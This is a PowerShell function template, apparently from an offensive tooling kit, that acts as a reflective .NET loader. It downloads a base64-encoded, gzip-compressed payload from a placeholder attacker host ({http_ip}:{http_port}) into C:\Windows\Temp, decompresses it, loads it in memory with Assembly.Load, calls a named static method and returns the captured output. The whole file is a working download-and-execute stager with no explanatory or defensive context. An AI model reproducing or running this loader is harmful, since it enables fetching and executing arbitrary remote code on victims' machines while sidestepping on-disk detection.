function Invoke-Reflect
{
    Invoke-WebRequest -Uri "http://{http_ip}:{http_port}/{PAYLOAD_BASE64_TXT}" -OutFile "C:\Windows\Temp\{PAYLOAD_BASE64_TXT}"
    $payload = Get-Content -Path "C:\Windows\Temp\{PAYLOAD_BASE64_TXT}" -Encoding Utf8
    $memoryStream=New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($payload))
    $gzipStream = New-Object System.IO.Compression.GzipStream($memoryStream,[System.IO.Compression.CompressionMode]::Decompress)
    $outputStream = New-Object System.IO.MemoryStream
    $gzipStream.CopyTo( $outputStream )


    $outputBytes = $outputStream.ToArray()

    $memoryStream.Close()
    $gzipStream.Close()

    [System.Reflection.Assembly]::LoadFile("C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\mscorlib.dll")
    [System.Reflection.Assembly]::LoadFile("C:\WINDOWS\Microsoft.NET\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll")
    $assembly = [System.Reflection.Assembly]::Load($outputBytes)

    $ConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    
    $class = $assembly.GetType("{PAYLOAD_CLASS}") 
    if (-not $class) {
        Write-Host "Class {PAYLOAD_CLASS} not found."
        exit
    }
    $method = $class.GetMethod("{PAYLOAD_METHOD}", [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
    if ($method) {
        Write-Host "`nInvoking {PAYLOAD_METHOD} method..."
        $method.Invoke($null, @([string[]]$args))
    } else {
        Write-Host "Method {PAYLOAD_METHOD} not found."
    }
    [Console]::SetOut($ConsoleOut)
    $Results = $StringWriter.ToString()
    $Results      
}